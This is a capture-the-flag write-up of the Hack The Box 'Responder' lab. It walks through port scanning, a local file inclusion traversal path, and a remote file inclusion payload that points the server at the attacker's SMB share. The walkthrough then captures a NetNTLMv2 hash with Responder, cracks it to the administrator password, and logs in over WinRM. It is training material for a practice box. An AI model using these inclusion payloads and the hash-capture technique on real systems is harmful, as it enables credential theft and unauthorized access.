## Box 4: Responder

 <img src="1.png" class="center">

This Box is tagged "SAMBA", "Enumeration", "Apache" and "WinRM". 

## Checking for open ports : 
First we run  **nmap -p- -sV -O 10.129.232.67**

 <img src="2.png" class="center">
 
 **Task1: How many TCP ports are open on the machine? :** 2 open ports 
 **- 80/tcp**
 **- 5985/tcp**  
 Seeing that a 5985/tcp port is open on our machine means that WinRM is configured and we can try entering a remote session.

**What is WinRM ?**
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.
If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!) . 

**Task2: When visiting the web service using the IP address, what is the domain that we are being redirected to?** unika.htb
At this point, we need to setup a local DNS using the hosts file (/etc/hosts) 

<img src="3.png" class="center"> 

By entering the ip given we will get this page :
<img src="14.png" class="center"> 


**Task3: Which scripting language is being used on the server to generate webpages?** PHP
By using the tool Wapppalyzer we can see that the scripting language used is PHP 

<img src="4.png" class="center"> 

**Task4: What is the name of the URL parameter which is used to load different language versions of the webpage?** page
**Task5: Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"**
../../../../../../../../windows/system32/drivers/etc/hosts

<img src="5.png" class="center"> 

**Task6: Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"**
//10.10.14.6/somefile

**What is RFI ?**
Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts. The perpetrator’s goal is to exploit the referencing function in an application to upload malware (e.g., backdoor shells) from a remote URL located within a different domain.

**Task7 : What does NTLM stand for?** New Technology Lan Manager 

**Task8 : Which flag do we use in the Responder utility to specify the network interface?** -I 


By using the responder which is an inbuilt Kali Linux tool for Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) that responds to specific NetBIOS queries based on the file server request.

<img src="6.png" class="center"> 
<img src="7.png" class="center"> 

Now that the responder server is listening , we will make the server include a ressource from our smb using the following payload:
**http://unika.htb/?page=//ourIP@/somefile**

The responder server got a NetNTLMv for the Administrator user.
<img src="8.png" class="center"> 
We can copy this hash into a file that we will call hash . 

**Task9 : There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?** John The Ripper 

We can now crack the hash that we have got using the tool John the Ripper to get the password of the Administrator like the following : 
<img src="9.png" class="center"> 

**Task10: What is the password for the administrator user?** badminton

**Task11: We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?** 5985

By using the tool evil winrm we can connect to the WinRM service on the target machine :

<img src="10.png" class="center"> 
<img src="11.png" class="center"> 
<img src="12.png" class="center"> 
We can find the flag under c:\Users\mike\Desktop
<img src="13.png" class="center"> 


